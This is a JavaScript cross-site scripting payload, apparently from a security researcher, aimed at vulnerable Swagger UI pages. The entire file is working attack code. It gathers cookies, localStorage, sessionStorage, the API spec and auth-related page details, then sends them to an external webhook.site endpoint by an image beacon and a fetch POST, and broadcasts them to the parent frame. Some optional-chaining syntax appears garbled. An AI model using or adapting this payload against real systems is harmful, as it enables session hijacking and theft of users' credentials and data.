// CyberTechAjju Advanced XSS Payload
// This script collects and exfiltrates data from vulnerable Swagger UI instances

// Configuration - Replace with your own webhook URL for testing
const WEBHOOK_URL = "https://webhook.site/9f06dd69-358d-45e5-b1f2-2b9066dd2b0f";

// Collect detailed environment information
const collectEnvironmentData = () => {
    const data = {
        origin: window.origin,
        location: window.location.toString(),
        href: window.location.href,
        hostname: window.location.hostname,
        pathname: window.location.pathname,
        search: window.location.search,
        parentOrigin: window.parent ? .origin || 'N/A',
        topOrigin: window.top ? .origin || 'N/A',
        framesLength: window.frames.length,
        windowName: window.name,
        cookies: document.cookie || 'No cookies available',
        localStorage: extractLocalStorage(),
        sessionStorage: extractSessionStorage(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timestamp: new Date().toISOString(),
        referrer: document.referrer,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        swaggerInfo: findSwaggerInfo(),
        domStructure: summarizeDOMStructure()
    };

    return data;
};

// Try to extract localStorage data
function extractLocalStorage() {
    try {
        const items = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            items[key] = localStorage.getItem(key);
        }
        return JSON.stringify(items);
    } catch (e) {
        return "Error accessing localStorage: " + e.message;
    }
}

// Try to extract sessionStorage data
function extractSessionStorage() {
    try {
        const items = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            items[key] = sessionStorage.getItem(key);
        }
        return JSON.stringify(items);
    } catch (e) {
        return "Error accessing sessionStorage: " + e.message;
    }
}

// Try to find Swagger UI specific information
function findSwaggerInfo() {
    try {
        const swaggerData = {
            version: window.ui ? .getState ? .() ? .meta ? .version || 'Unknown',
            spec: JSON.stringify(window.ui ? .getState ? .() ? .spec || {}).substring(0, 500) + '...',
            isSwaggerUI: !!document.querySelector('.swagger-ui'),
            configUrl: new URLSearchParams(window.location.search).get('configUrl')
        };
        return swaggerData;
    } catch (e) {
        return "Error accessing Swagger UI data: " + e.message;
    }
}

// Summarize DOM structure to identify interesting elements
function summarizeDOMStructure() {
    try {
        const interestingElements = {
            forms: document.forms.length,
            inputs: document.querySelectorAll('input').length,
            buttons: document.querySelectorAll('button').length,
            apiElements: document.querySelectorAll('[data-path]').length,
            authElements: document.querySelectorAll('.auth-wrapper, .authorize, [id*=auth]').length
        };
        return interestingElements;
    } catch (e) {
        return "Error analyzing DOM: " + e.message;
    }
}

// Format the collected data for display
const formatDetailsForDisplay = (data) => {
    return `
    🚨 XSS Detected 🚨
    ========================
    🏁 Origin: ${data.origin}
    🌐 Location: ${data.location}
    🔗 Href: ${data.href}
    🏢 Hostname: ${data.hostname}
    📂 Pathname: ${data.pathname}
    ❓ Search: ${data.search}
    👪 Parent Origin: ${data.parentOrigin}
    🧑‍💻 Top Origin: ${data.topOrigin}
    🖼️ Frames Length: ${data.framesLength}
    🪪 Window Name: ${data.windowName}
    ========================
    🍪 Cookies: ${data.cookies}
    🕵️ User-Agent: ${data.userAgent}
    ⏳ Timestamp: ${data.timestamp}
    👤 Author: CyberTechAjju
  `;
};

// Send data to webhook
const exfiltrateData = async(data) => {
    try {
        // Create a fake image to exfiltrate data through URL parameters in case fetch is blocked
        new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;

        // Also try fetch API
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            mode: 'no-cors'
        });

        // If in an iframe, try to navigate the parent if same-origin
        try {
            if (window.parent && window.parent !== window) {
                // Try to steal focus or redirect parent if possible
                // (This will only work if same-origin policy allows)
                window.parent.postMessage({ type: 'XSS_DETECTED', data }, '*');
            }
        } catch (e) {
            console.log('Could not interact with parent frame');
        }
    } catch (e) {
        console.error('Exfiltration failed:', e);
    }
};

// Main execution
const data = collectEnvironmentData();
const details = formatDetailsForDisplay(data);

// Display alert with collected information
alert(details);

// Log details to console
console.log('XSS Detected by CyberTechAjju:', data);

// Send data to remote server
exfiltrateData(data);
